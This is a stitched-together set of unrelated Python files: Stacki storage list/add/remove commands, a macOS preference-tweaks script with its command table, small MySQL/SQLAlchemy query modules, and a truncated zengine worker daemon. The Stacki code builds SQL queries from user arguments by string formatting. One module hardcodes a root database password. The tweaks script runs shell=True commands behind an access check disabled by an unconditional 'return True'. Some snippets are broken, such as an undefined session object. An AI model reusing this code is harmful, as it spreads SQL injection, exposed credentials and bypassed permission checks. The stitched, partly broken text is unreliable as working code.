				name = '%s' """ % name)
			tableid, = self.db.fetchone()

		#
		# make sure the specification for mountpt doesn't already exist
		#
		if mountpt:
			self.checkIt(device, scope, tableid, mountpt)

		if not options:
			options = ""
		
		#
		# now add the specifications to the database
		#
		sqlvars = "Scope, TableID, device, Mountpoint, Size, FsType, Options"
		sqldata = "'%s', %s, '%s', '%s', %s, '%s', '%s'" % \
			(scope, tableid, device, mountpt, size, fstype, options)

		if partid:
			sqlvars += ", PartID"
			sqldata += ", %s" % partid

		self.db.execute("""insert into storage_partition
			(%s) values (%s) """ % (sqlvars, sqldata))

#
# @copyright@
# Copyright (c) 2006 - 2018 Teradata
# All rights reserved. Stacki(r) v5.x stacki.com
# https://github.com/Teradata/stacki/blob/master/LICENSE.txt
# @copyright@
#

import stack.commands
from stack.exception import ArgError, ParamValue


class Command(stack.commands.list.command,
		stack.commands.OSArgumentProcessor,
		stack.commands.ApplianceArgumentProcessor,
		stack.commands.HostArgumentProcessor):

	"""
	List the storage controller configuration for one of the following:
	global, os, appliance or host.

	<arg optional='1' type='string' name='host'>
	This argument can be nothing, a valid 'os' (e.g., 'redhat'), a valid
	appliance (e.g., 'backend') or a host.
	If nothing is supplied, then the global storage controller
	configuration will be output.
	</arg>

	<example cmd='list storage controller backend-0-0'>
	List host-specific storage controller configuration for backend-0-0.
	</example>

	<example cmd='list storage controller backend'>
	List appliance-specific storage controller configuration for all
	backend appliances.
	</example>

	<example cmd='list storage controller'>
	List global storage controller configuration for all hosts.
	</example>

	"""

	def run(self, params, args):
		scope = None
		oses = []
		appliances = []
		hosts = []

		if len(args) == 0:
			scope = 'global'
		elif len(args) == 1:
			try:
				oses = self.getOSNames(args)
			except:
				oses = []

			try:
				appliances = self.getApplianceNames()
			except:
				appliances = []

			try:
				hosts = self.getHostnames()
			except:
				hosts = []

		else:
			raise ArgError(self, 'scope', 'must be unique or missing')

		if not scope:
			if args[0] in oses:
				scope = 'os'
			elif args[0] in appliances:
				scope = 'appliance'
			elif args[0] in hosts:
				scope = 'host'

		if not scope:
			raise ParamValue(self, 'scope', 'valid os, appliance name or host name')

		query = None
		if scope == 'global':
			query = """select adapter, enclosure, slot, raidlevel,
				arrayid, options from storage_controller 
				where scope = 'global'
				order by enclosure, adapter, slot"""
		elif scope == 'os':
			#
			# not currently supported
			#
			return                    
		elif scope == 'appliance':
			query = """select adapter, enclosure, slot,
				raidlevel, arrayid, options
				from storage_controller where
				scope = "appliance" and tableid = (select
				id from appliances
				where name = '%s')
				order by enclosure, adapter, slot""" % args[0]
		elif scope == 'host':
			query = """select adapter, enclosure, slot,
				raidlevel, arrayid, options
				from storage_controller where
				scope = "host" and tableid = (select
				id from nodes where name = '%s')
				order by enclosure, adapter, slot""" % args[0]

		if not query:
			return                    

		name = None
		if scope == 'global':
			name = 'global'
		elif scope in [ 'appliance', 'host']:                    
			name = args[0]

		self.beginOutput()

		self.db.execute(query)

		i = 0
		for row in self.db.fetchall():
			adapter, enclosure, slot, raidlevel, arrayid, options = row

			if i > 0:
				name = None
			if adapter == -1:
				adapter = None
			if enclosure == -1:
				enclosure = None
			if slot == -1:
				slot = '*'
			if raidlevel == '-1':
				raidlevel = 'hotspare'
			if arrayid == -1:
				arrayid = 'global'
			elif arrayid == -2:
				arrayid = '*'
			# Remove leading and trailing double quotes
			options = options.strip("\"")

			self.addOutput(name, [ enclosure, adapter, slot,
				raidlevel, arrayid, options ])

			i += 1

		self.endOutput(header=['scope', 'enclosure', 'adapter', 'slot', 
			'raidlevel', 'arrayid', 'options' ], trimOwner=False)


# @copyright@
# Copyright (c) 2006 - 2018 Teradata
# All rights reserved. Stacki(r) v5.x stacki.com
# https://github.com/Teradata/stacki/blob/master/LICENSE.txt
# @copyright@

import stack.commands
from stack.exception import ArgError, ParamValue


class Command(stack.commands.list.command,
		stack.commands.OSArgumentProcessor,
		stack.commands.ApplianceArgumentProcessor,
		stack.commands.HostArgumentProcessor):

	"""
	List the storage partition configuration for one of the following:
	global, os, appliance or host.

	<arg optional='1' type='string' name='host'>
	This argument can be nothing, a valid 'os' (e.g., 'redhat'), a valid
	appliance (e.g., 'backend') or a host.
	If nothing is supplied, then the global storage partition
	configuration will be output.
	</arg>

	<param type="bool" name="globalOnly" optional="0" default="n">
	Flag that specifies if only the 'global' partition entries should
	be displayed.
	</param>

	<example cmd='list storage partition backend-0-0'>
	List host-specific storage partition configuration for backend-0-0.
	</example>

	<example cmd='list storage partition backend'>
	List appliance-specific storage partition configuration for all
	backend appliances.
	</example>

	<example cmd='list storage partition'>
	List all storage partition configurations in the database.
	</example>

	<example cmd='list storage partition globalOnly=y'>
	Lists only global storage partition configuration i.e. configuration
	not associated with a specific host or appliance type.
	</example>
	"""

	def run(self, params, args):
		scope = None
		oses = []
		appliances = []
		hosts = []

		globalOnly, = self.fillParams([('globalOnly', 'n')])
		globalOnlyFlag = self.str2bool(globalOnly)

		if len(args) == 0:
			scope = 'global'
		elif len(args) == 1:
			try:
				oses = self.getOSNames(args)
			except:
				oses = []

			try:
				appliances = self.getApplianceNames()
			except:
				appliances = []

			try:
				hosts = self.getHostnames()
			except:
				hosts = []

		else:
			raise ArgError(self, 'scope', 'must be unique or missing')

		if not scope:
			if args[0] in oses:
				scope = 'os'
			elif args[0] in appliances:
				scope = 'appliance'
			elif args[0] in hosts:
				scope = 'host'

		if not scope:
			raise ParamValue(self, 'scope', 'valid os, appliance name or host name')
		query = None
		if scope == 'global':
			if globalOnlyFlag:
				query = """select scope, device, mountpoint, size, fstype, options, partid 
					from storage_partition
					where scope = 'global'
					order by device,partid,fstype, size"""
			else:
				query = """(select scope, device, mountpoint, size, fstype, options, partid
					from storage_partition where scope = 'global') UNION ALL
					(select a.name, p.device, p.mountpoint, p.size,
					p.fstype, p.options, p.partid from storage_partition as p inner join
					nodes as a on p.tableid=a.id where p.scope='host') UNION ALL
					(select a.name, p.device, p.mountpoint, p.size,
					p.fstype, p.options, p.partid from storage_partition as p inner join
					appliances as a on p.tableid=a.id where
					p.scope='appliance') order by scope,device,partid,size,fstype"""
		elif scope == 'os':
			#
			# not currently supported
			#
			return                    
		elif scope == 'appliance':
			query = """select scope, device, mountpoint, size, fstype, options, partid
				from storage_partition where scope = "appliance"
				and tableid = (select id from appliances
				where name = '%s') order by device,partid,fstype, size""" % args[0]
		elif scope == 'host':
			query = """select scope, device, mountpoint, size, fstype, options, partid
				from storage_partition where scope="host" and
				tableid = (select id from nodes
				where name = '%s') order by device,partid,fstype, size""" % args[0]

		if not query:
			return                    

		self.beginOutput()

		self.db.execute(query)

		i = 0
		for row in self.db.fetchall():
			name, device, mountpoint, size, fstype, options, partid = row
			if size == -1:
				size = "recommended"
			elif size == -2:
				size = "hibernation"

			if name == "host" or name == "appliance":                    
				name = args[0]	

			if mountpoint == 'None':
				mountpoint = None

			if fstype == 'None':
				fstype = None

			if partid == 0:
				partid = None

			self.addOutput(name, [device, partid, mountpoint,
				size, fstype, options])

			i += 1

		self.endOutput(header=['scope', 'device', 'partid', 'mountpoint', 'size', 'fstype', 'options'], trimOwner=False)


# @copyright@
# Copyright (c) 2006 - 2018 Teradata
# All rights reserved. Stacki(r) v5.x stacki.com
# https://github.com/Teradata/stacki/blob/master/LICENSE.txt
# @copyright@

import stack.commands
from stack.exception import ArgError, ParamValue


class Command(stack.commands.list.command,
		stack.commands.OSArgumentProcessor,
		stack.commands.ApplianceArgumentProcessor,
		stack.commands.HostArgumentProcessor):

	"""
	List the storage partition configuration for one of the following:
	global, os, appliance or host.

	<arg optional='1' type='string' name='host'>
	This argument can be nothing, a valid 'os' (e.g., 'redhat'), a valid
	appliance (e.g., 'backend') or a host.
	If nothing is supplied, then the global storage partition
	configuration will be output.
	</arg>

	<param type="bool" name="globalOnly" optional="0" default="n">
	Flag that specifies if only the 'global' partition entries should
	be displayed.
	</param>

	<example cmd='list storage partition backend-0-0'>
	List host-specific storage partition configuration for backend-0-0.
	</example>

	<example cmd='list storage partition backend'>
	List appliance-specific storage partition configuration for all
	backend appliances.
	</example>

	<example cmd='list storage partition'>
	List all storage partition configurations in the database.
	</example>

	<example cmd='list storage partition globalOnly=y'>
	Lists only global storage partition configuration i.e. configuration
	not associated with a specific host or appliance type.
	</example>
	"""

	def run(self, params, args):
		scope = None
		oses = []
		appliances = []
		hosts = []

		globalOnly, = self.fillParams([('globalOnly', 'n')])
		globalOnlyFlag = self.str2bool(globalOnly)

		if len(args) == 0:
			scope = 'global'
		elif len(args) == 1:
			try:
				oses = self.getOSNames(args)
			except:
				oses = []

			try:
				appliances = self.getApplianceNames()
			except:
				appliances = []

			try:
				hosts = self.getHostnames()
			except:
				hosts = []

		else:
			raise ArgError(self, 'scope', 'must be unique or missing')

		if not scope:
			if args[0] in oses:
				scope = 'os'
			elif args[0] in appliances:
				scope = 'appliance'
			elif args[0] in hosts:
				scope = 'host'
		if not scope:
			raise ParamValue(self, 'scope', 'valid os, appliance name or host name')
		query = None
		if scope == 'global':
			if globalOnlyFlag:
				query = """select scope, device, mountpoint, size, fstype, options, partid                     
					from storage_partition
					where scope = 'global'
					order by device,partid,fstype, size"""
			else:
				query = """(select scope, device, mountpoint, size, fstype, options, partid
					from storage_partition where scope = 'global') UNION ALL
					(select a.name, p.device, p.mountpoint, p.size,
					p.fstype, p.options, p.partid from storage_partition as p inner join
					nodes as a on p.tableid=a.id where p.scope='host') UNION ALL
					(select a.name, p.device, p.mountpoint, p.size,
					p.fstype, p.options, p.partid from storage_partition as p inner join
					appliances as a on p.tableid=a.id where
					p.scope='appliance') order by scope,device,partid,size,fstype"""




		elif scope == 'os':
			query = """select scope, device, mountpoint, size, fstype, options, partid                    
				from storage_partition where scope = "os" and tableid = (select id
				from oses where name = '%s') order by device,partid,fstype,size""" % args[0]                    
		elif scope == 'appliance':
			query = """select scope, device, mountpoint, size, fstype, options, partid                    
				from storage_partition where scope = "appliance"
				and tableid = (select id from appliances
				where name = '%s') order by device,partid,fstype, size""" % args[0]                    
		elif scope == 'host':
			query = """select scope, device, mountpoint, size, fstype, options, partid                    
				from storage_partition where scope="host" and
				tableid = (select id from nodes
				where name = '%s') order by device,partid,fstype, size""" % args[0]                    

		if not query:
			return

		self.beginOutput()

		self.db.execute(query)                    
		i = 0                    
		for row in self.db.fetchall():                    
			name, device, mountpoint, size, fstype, options, partid = row                    
			if size == -1:
				size = "recommended"
			elif size == -2:
				size = "hibernation"
			if name == "host" or name == "appliance" or name == "os":
				name = args[0]	                    

			if mountpoint == 'None':
				mountpoint = None

			if fstype == 'None':
				fstype = None

			if partid == 0:
				partid = None

			self.addOutput(name, [device, partid, mountpoint,                    
				size, fstype, options])                    

			i += 1                    

		self.endOutput(header=['scope', 'device', 'partid', 'mountpoint', 'size', 'fstype', 'options'], trimOwner=False)                    


# @copyright@
# Copyright (c) 2006 - 2018 Teradata
# All rights reserved. Stacki(r) v5.x stacki.com
# https://github.com/Teradata/stacki/blob/master/LICENSE.txt
# @copyright@

import stack.commands
from stack.exception import ArgRequired, ArgError, ParamValue, ParamRequired


class Command(stack.commands.remove.command,
		stack.commands.OSArgumentProcessor,
		stack.commands.HostArgumentProcessor,
		stack.commands.ApplianceArgumentProcessor):
	"""
	Remove a storage partition configuration from the database.

	<param type='string' name='scope' optional='0'>
	Scope of partition definition: a valid os (e.g.,
	'redhat'), a valid appliance (e.g., 'backend') or a valid host
	(e.g., 'backend-0-0). Default scope is 'global'.
	</param>

	<arg type='string' name='name'>
	Zero or one argument of host, appliance or os name
	</arg>

	<param type='string' name='device' optional='1'>
	Device whose partition configuration needs to be removed from
	the database.
	</param>

	<param type='string' name='mountpoint' optional='1'>
	Mountpoint for the partition that needs to be removed from
	the database.
	</param>

	<example cmd='remove storage partition backend-0-0 device=sda'>
	Remove the disk partition configuration for sda on backend-0-0.
	</example>

	<example cmd='remove storage partition backend-0-0 device=sda mountpoint=/var'>
	Remove the disk partition configuration for partition /var on sda on backend-0-0.
	</example>

	<example cmd='remove storage partition backend'>
	Remove the disk array configuration for backend
	appliance.
	</example>
	"""

	def run(self, params, args):
		(scope, device, mountpoint) = self.fillParams([
			('scope', 'global'), ('device', None), ('mountpoint', None)])                    
		oses = []
		appliances = []
		hosts = []
		name = None
		accepted_scopes = ['global', 'os', 'appliance', 'host']

		# Some checking that we got usable input.:
		if scope not in accepted_scopes:
			raise ParamValue(self, '%s' % params, 'one of the following: %s' % accepted_scopes )
		elif scope == 'global' and len(args) >= 1:
			raise ArgError(self, '%s' % args, 'unexpected, please provide a scope: %s' % accepted_scopes)
		elif scope == 'global' and (device is None and mountpoint is None):
			raise ParamRequired(self, 'device OR mountpoint')
		elif scope != 'global' and len(args) < 1:
			raise ArgRequired(self, '%s name' % scope)

		if scope == "os":
			oses = self.getOSNames(args)
		elif scope == "appliance":
			appliances = self.getApplianceNames(args)
		elif scope == "host":
			hosts = self.getHostnames(args)

		if scope != 'global':                    
			name = args[0]

		#
		# look up the id in the appropriate 'scope' table
		#
		tableid = -1                    
		tablename = {"os":"oses", "appliance":"appliances", "host":"nodes"}                    
		if scope != 'global':                    
			self.db.execute("""select id from %s where                    
				name = '%s' """ % (tablename[scope], name))                    
			tableid, = self.db.fetchone()                    

		deletesql = """delete from storage_partition where                    
			scope = '%s' and tableid = %s """ % (scope, tableid)                    

		if device and device != '*':
			deletesql += """ and device = '%s'""" % device                    

		if mountpoint and mountpoint != '*':
			deletesql += """ and mountpoint = '%s'""" % mountpoint                    

		self.db.execute(deletesql)                    


#! /usr/bin/env python3
"""
Set user settings to optimize performance, Finder and windowing features, and automate standard preference
settings.

While this is an Apple specific script, it doesn't check to see if it's executing on a Mac.
"""

import dglogger
import argparse
import os
import getpass
import grp
import platform
import re
import pexpect
import shlex
import subprocess
import sys


def is_admin():
    """Check to see if the user belongs to the 'admin' group.

    :return: boolean
    """
    return os.getlogin() in grp.getgrnam('admin').gr_mem


def is_executable(tweak_group, groups, is_admin = is_admin()):
    """Determines if the tweak should be executed.

    :param tweak_group: tweak's group key value.
    :param groups: groups specified on the command line.
    :param is_admin: True if user belongs to 'admn' group.
    :rtype: boolean
    """
    return True # for testing                    
    if groups is None and tweak_group != 'sudo':
        return True
    if groups is None and tweak_group == 'sudo' and is_admin:
        return True
    if groups is not None and tweak_group in groups and tweak_group != 'sudo':
        return True
    if groups is not None and tweak_group in groups and tweak_group == 'sudo' and is_admin:
        return True
    return False


def os_supported(min_v, max_v):
    """Checks to see if the preference is supported on your version of the Mac OS.
    NB: 10.9 is represented in the tweaks.py file as 10.09.

    :param min_v:
    :param max_v:
    :return: boolean
    """
    os_version = re.match('[0-9]+\.[0-9]+', platform.mac_ver()[0]).group(0)  # major.minor
    return not (os_version < str(min_v) or (max_v is not None and os_version > str(max_v)))


def run_batch_mode(tweaks, args):
    for t in tweaks:
        if os_supported(t['os_v_min'], t['os_v_max']) \
                and is_executable(t['group'], args.groups, is_admin()) \
                and t['group'] != 'test':
            run_command(t['set'])


def run_command(cmd):
    try:
        subprocess.run(cmd, shell=True, timeout=60, check=True)                    
        dglogger.log_info(str(cmd))
    except subprocess.CalledProcessError as e:
#        dglogger.log_error(e, file=sys.stderr)
        dglogger.log_error(str(e)) # figure out deal w/file=sys.stderr!
    except subprocess.TimeoutExpired as e:
        dglogger.log_error(e, file=sys.stderr)
    except OSError as e:
        dglogger.log_error(e, file=sys.stderr)
    except KeyError as e:
        dglogger.log_error(e, file=sys.stderr)
    except TypeError as e:
        dglogger.log_error(e)

def run_interactive_mode():
    print("Interactive not implemented")


def run_list_mode(indent = '    '):
    """helper function to print summary info from the tweaks list.

    :global arg.list: replies on global results from parser.
    :param indent: number of spaces to indent. Defaults to 4.
    :return:
    """
    print("--list: " + str(args.list))

    if args.list == 'a' or args.list == 'all' or args.list == 'g' or args.list == 'groups':
        grp = set()
        for s in tweaks.tweaks:
            grp.add(s['group'])

        print('The groups are:')
        for t in sorted(grp):
            print(indent + t)

    if args.list == 'a' or args.list == 'all' or args.list == 'd' or args.list == 'descriptions':
        descriptions = set()
        for d in tweaks.tweaks:
            descriptions.add(d['group'] + ' | ' + d['description'])

        print('group | description:')
        for t in sorted(descriptions):
            print(indent + t)


def main():
    log_file = dglogger.log_config()

    dglogger.log_start()

    parser = argparse.ArgumentParser(
        description="""install_mac_tweaks changes user and global settings to improve performance, security, 
    and convenience. Results logged to a file."""
    )
    group = parser.add_mutually_exclusive_group()
    group.add_argument("--mode", choices=['b', 'batch', 'i', 'interactive'],
                   action = 'store', default = 'batch',
                   help='Run interactively to confirm each change.')
    group.add_argument('--list', choices = ['all', 'a', 'groups', 'g', 'descriptions', 'd'],
                   action = 'store',
                   help='Print lists of the groups and set commands. Silently ignores --groups.')
    parser.add_argument('--groups', type = str, nargs='+',
                    help='Select a subset of tweaks to execute')
    args = parser.parse_args()

    try:
        import tweaks
    except ImportError as e:
        dglogger.log_error(e, file=sys.stderr)
        dglogger.log_end(log_file)
        sys.exit(1)

    if args.list is not None:
        run_list_mode()
        sys.exit(0)
    elif args.mode == 'batch' or args.mode == 'b':
        run_batch_mode(tweaks.tweaks, args)
    elif args.mode == 'interactive' or args.mode == 'i':
        run_interactive_mode()

    dglogger.log_end(log_file)


if __name__ == '__main__':
    main()
else:
    print("WARNING: Was not expecting to be imported. Exiting.")

# regex to replace i and b for mode - code or argsparse fiddling - probably can do in argparse
# pswd = getpass.getpass()
# getpass.getuser() for user name - check this code, installer.py & dot-profile, rpr-3-sort-a-diofile.site, home-profile
# # Sorting dictionaries: https://stackoverflow.com/questions/20944483/pythonct-by-its-values/20948781?utm_medium=organic&utm_source=google_rich_qa&utm_campaign=google_rich_qa
# Sorting dictionaries: https://www.pythoncentral.io/how-to-sort-python-dictionaries-by-key-or-value/
# Asking for a password: https://askubuntu.com/questions/155791/how-do-i-sudo-a-command-in-a-script-without-being-asked-for-a-password
# Add shlex parsing for safe passing of parameters
# --list output to less or more for pagination

#! /usr/bin/env python3
#  -*- coding: utf-8 -*-

# Definition of OS X/MacOS tweaks
# group, description, set, get, os_v_min, os_ver_max

tweaks = [
    {'group': 'test',
     'description': 'Test exception handling',
     'get': "foobar",
     'set': "set-foobar",
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'animation',
     'description': 'Disable animations when opening and closing windows.',
     'get': "defaults read NSGlobalDomain NSAutomaticWindowAnimationsEnabled",
     'set': "defaults write NSGlobalDomain NSAutomaticWindowAnimationsEnabled -bool false",
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'animation',
     'description': 'Disable animations when opening a Quick Look window.',
     'set': "defaults write -g QLPanelAnimationDuration -float 0",
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'animation',
     'description': 'Disable animation when opening the Info window in OS X Finder (cmd⌘ + i).',
     'set': 'defaults write com.apple.finder DisableAllAnimations -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'animation',
     'description': 'Accelerated playback when adjusting the window size (Cocoa applications).',
     'set': 'defaults write NSGlobalDomain NSWindowResizeTime -float 0.001',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'animation',
     'description': 'Disable animations when you open an application from the Dock.',
     'set': 'defaults write com.apple.dock launchanim -bool false',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'app',
     'description': 'Always show the full URL in the search/url field',
     'get': 'defaults read com.apple.Safari ShowFullURLInSmartSearchField',
     'set': 'defaults write com.apple.Safari ShowFullURLInSmartSearchField -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'admin',
     'description': 'Show Recovery partition & EFI Boot partition',
     'set': 'defaults write com.apple.DiskUtility DUDebugMenuEnabled -bool true',
     'os_v_min': '10.09', 'os_v_max': '10.10'
     },
    {'group': 'general',
     'description': 'Disable shadow in screenshots',
     'set': 'defaults write com.apple.screencapture disable-shadow -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'sudo',
     'description': 'Disable Bonjour multicast advertisements.\n  See https://www.trustwave.com/Resources/SpiderLabs-Blog/mDNS---Telling-the-world-about-you-(and-your-device)/',
     'get': 'sudo defaults read /Library/Preferences/com.apple.mDNSResponder.plist NoMulticastAdvertisements',                    
     'set': 'sudo defaults write /Library/Preferences/com.apple.mDNSResponder.plist NoMulticastAdvertisements -bool YES',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'sudo',
     'description': 'Disable WiFi hotspot screen',
     'get': 'sudo defaults read /Library/Preferences/SystemConfiguration/com.apple.captive.control Active',                    
     'set': 'sudo defaults write /Library/Preferences/SystemConfiguration/com.apple.captive.control Active -boolean false',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'general',
     'description': 'Don’t show Dashboard as a Space',
     'get': 'defaults read com.apple.dock dashboard-in-overlay',
     'set': 'defaults write com.apple.dock dashboard-in-overlay -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'Finder',
     'description': 'Show file path in title of finder window',
     'set': 'defaults write com.apple.finder _FXShowPosixPathInTitle -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'general',
     'description': 'Enable AirDrop feature for ethernet connected Macs',
     'set': 'defaults write com.apple.NetworkBrowser BrowseAllInterfaces -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'general',
     'description': 'Always show scroll bars',
     'set': 'defaults write NSGlobalDomain AppleShowScrollBars -string "Always"',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'general',
     'description': 'Expand Save panel by default (1/2)',
     'set': 'defaults write NSGlobalDomain NSNavPanelExpandedStateForSaveMode -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'general',
     'description': 'Expand Save panel by default (2/2)',
     'set': 'defaults write NSGlobalDomain NSNavPanelExpandedStateForSaveMode2 -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'general', 'description': 'Expand Print menu by default (1/2)',
     'set': 'defaults write NSGlobalDomain PMPrintingExpandedStateforPrint -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'general', 'description': 'Expand Print menu by default (2/2)',
     'set': 'defaults write NSGlobalDomain PMPrintingExpandedStateforPrint2 -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'general',
     'description': 'Make all animations faster that are used by Mission Control.',
     'set': 'defaults write com.apple.dock expose-animation-duration -float 0.1',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'Finder',
     'description': 'Disable the delay when you hide the Dock',
     'set': 'defaults write com.apple.Dock autohide-delay -float 0',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'Finder',
     'description': 'Remove the animation when hiding/showing the Dock',
     'set': 'defaults write com.apple.dock autohide-time-modifier -float 0',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'app',
     'description': 'Disable the animation when you replying to an e-mail',
     'set': 'defaults write com.apple.mail DisableReplyAnimations -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'app',
     'description': 'Disable the animation when you sending an e-mail',
     'set': 'defaults write com.apple.mail DisableSendAnimations -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'app',
     'description': 'Disable the standard delay in rendering a Web page.',
     'set': 'defaults write com.apple.Safari WebKitInitialTimedLayoutDelay 0.25',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'general',
     'description': 'The keyboard react faster to keystrokes (not equally useful for everyone)',
     'set': 'defaults write NSGlobalDomain KeyRepeat -int 0',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'general',
     'description': 'Disable smooth scrolling for paging (space bar)',
     'set': 'defaults write -g NSScrollAnimationEnabled -bool false',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'Finder',
     'description': 'Avoid creating .DS_Store files on network volumes',
     'set': 'defaults write com.apple.desktopservices DSDontWriteNetworkStores -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'Finder',
     'description': 'Avoid creating .DS_Store files on USB volumes',
     'set': 'defaults write com.apple.desktopservices DSDontWriteUSBStores -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'Finder',
     'description': 'Show the ~/Library folder',
     'set': 'chflags nohidden ~/Library',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'Finder',
     'description': 'Save to disk (not to iCloud) by default',
     'set': 'defaults write NSGlobalDomain NSDocumentSaveNewDocumentsToCloud -bool false',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'Finder',
     'description': 'Disable the warning when changing a file extension',
     'set': 'defaults write com.apple.finder FXEnableExtensionChangeWarning -bool false',
     'os_v_min': '10.09', 'os_v_max': None
     }
]

from mysql_commands import *                    

def select_all_apps():
	return select_row_from_mysql_command("SELECT * FROM apps")                    

def select_all_apps_from_user(user_id):
	return select_row_from_mysql_command("SELECT * FROM apps a LEFT JOIN users_apps ua ON ua.app_id = a.id WHERE ua.user_id=?", user_id)                    

def select_all_devices_from_user(user_id):
	return select_row_from_mysql_command("SELECT * FROM devices WHERE user_id=?", user_id)                    


import sqlalchemy                    
from sqlalchemy import text                    
from sqlalchemy.orm import sessionmaker, scoped_session                    

engine = sqlalchemy.create_engine('mysql+pymysql://root:bajtastore@127.0.0.1/mydb')                    
Session = scoped_session(sessionmaker(bind=engine))                    

def select_all_apps():
	return s.execute("SELECT * FROM apps").fetchall()                    

def select_all_apps_from_user(user_id):
	return s.execute("SELECT * FROM apps a LEFT JOIN users_apps ua ON ua.app_id = a.id WHERE ua.user_id=?", user_id)                    

def select_all_devices_from_user(user_id):
	return s.execute("SELECT * FROM devices WHERE user_id=?", user_id)                    

#!/usr/bin/env python
"""
workflow worker daemon
"""
import json
import traceback
from pprint import pformat

import signal
from time import sleep, time

import pika
from tornado.escape import json_decode

from pyoko.conf import settings
from pyoko.lib.utils import get_object_from_path
from zengine.client_queue import ClientQueue, BLOCKING_MQ_PARAMS
from zengine.engine import ZEngine
from zengine.current import Current
from zengine.lib.cache import Session, KeepAlive
from zengine.lib.exceptions import HTTPError                    
from zengine.log import log
import sys
# receivers should be imported at right time, right place
# they will not registered if not placed in a central location
# but they can cause "cannot import settings" errors if imported too early
from zengine.receivers import *

sys._zops_wf_state_log = ''

wf_engine = ZEngine()

LOGIN_REQUIRED_MESSAGE = {'error': "Login required", "code": 401}
class Worker(object):
    """
    Workflow runner worker object
    """
    INPUT_QUEUE_NAME = 'in_queue'
    INPUT_EXCHANGE = 'input_exc'

    def __init__(self):
        self.connect()
        signal.signal(signal.SIGTERM, self.exit)
        log.info("Worker starting")

    def exit(self, signal=None, frame=None):
        """
        Properly close the AMQP connections
        """
        self.input_channel.close()
        self.client_queue.close()
        self.connection.close()
        log.info("Worker exiting")
        sys.exit(0)

    def connect(self):
        """
        make amqp connection and create channels and queue binding
        """
        self.connection = pika.BlockingConnection(BLOCKING_MQ_PARAMS)
        self.client_queue = ClientQueue()
        self.input_channel = self.connection.channel()

        self.input_channel.exchange_declare(exchange=self.INPUT_EXCHANGE,
                                            type='topic',
                                            durable=True)
        self.input_channel.queue_declare(queue=self.INPUT_QUEUE_NAME)
        self.input_channel.queue_bind(exchange=self.INPUT_EXCHANGE, queue=self.INPUT_QUEUE_NAME)
        log.info("Bind to queue named '%s' queue with exchange '%s'" % (self.INPUT_QUEUE_NAME,
                                                                        self.INPUT_EXCHANGE))

    def run(self):
        """
        actual consuming of incoming works starts here
        """
        self.input_channel.basic_consume(self.handle_message,
                                         queue=self.INPUT_QUEUE_NAME,
                                         no_ack=True)
        try:
            self.input_channel.start_consuming()
        except (KeyboardInterrupt, SystemExit):
            log.info(" Exiting")
            self.exit()

    def _prepare_error_msg(self, msg):
        try:
            return \
                msg + '\n\n' + \
                "INPUT DATA: %s\n\n" % pformat(self.current.input) + \
                "OUTPUT DATA: %s\n\n" % pformat(self.current.output) + \
                sys._zops_wf_state_log
        except:
            return msg

    def _handle_ping_pong(self, data, session):

        still_alive = KeepAlive(sess_id=session.sess_id).update_or_expire_session()
        msg = {'msg': 'pong'}
        if not still_alive:
            msg.update(LOGIN_REQUIRED_MESSAGE)
        return msg

    def _handle_job(self, session, data, headers):
        self.current = Current(session=session, input=data)
        self.current.headers = headers
        # import method
        method = get_object_from_path(settings.BG_JOBS[data['job']])
        # call view with current object
        method(self.current)


    def _handle_view(self, session, data, headers):
        # create Current object
        self.current = Current(session=session, input=data)
        self.current.headers = headers

        # handle ping/pong/session expiration
        if data['view'] == 'ping':
            return self._handle_ping_pong(data, session)

        # handle authentication
        if not (self.current.is_auth or data['view'] in settings.ANONYMOUS_WORKFLOWS):
            return LOGIN_REQUIRED_MESSAGE

        # import view
        view = get_object_from_path(settings.VIEW_URLS[data['view']])

        # call view with current object
        view(self.current)

        # return output
        return self.current.output

    def _handle_workflow(self, session, data, headers):
        wf_engine.start_engine(session=session, input=data, workflow_name=data['wf'])
        wf_engine.current.headers = headers
        self.current = wf_engine.current
        wf_engine.run()
        # if self.connection.is_closed:
        #     log.info("Connection is closed, re-opening...")
        #     self.connect()
        return wf_engine.current.output

    def handle_message(self, ch, method, properties, body):
        """
        this is a pika.basic_consumer callback
        handles client inputs, runs appropriate workflows and views

        Args:
            ch: amqp channel
            method: amqp method
            properties:
            body: message body
        """
        input = {}
        try:
            self.sessid = method.routing_key

            input = json_decode(body)
            data = input['data']

            # since this comes as "path" we dont know if it's view or workflow yet
            #TODO: just a workaround till we modify ui to
            if 'path' in data:
                if data['path'] in settings.VIEW_URLS:
                    data['view'] = data['path']
                else:
                    data['wf'] = data['path']
            session = Session(self.sessid)

            headers = {'remote_ip': input['_zops_remote_ip']}                    

            if 'wf' in data:
                output = self._handle_workflow(session, data, headers)
